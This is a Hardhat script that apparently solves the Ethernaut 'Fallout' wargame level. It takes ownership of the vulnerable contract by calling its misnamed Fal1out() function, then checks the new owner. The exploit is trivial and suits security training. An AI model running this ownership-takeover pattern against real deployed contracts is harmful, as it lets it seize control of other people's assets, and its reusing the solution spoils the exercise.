const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0xC23c209dD0866C4092aabF840B0E0d93533D7839"
    let target = await ethers.getContractAt("Fallout", instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)

    // Attack
    tx = await target.Fal1out()
    tx.wait(1)

    // Check
    owner = await target.owner()
    if (owner == attacker.address) {
        console.log(`${symbols.success} Owned Contract`)
    } else {
        console.log(`${symbols.error} Contract owner is ${owner}!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
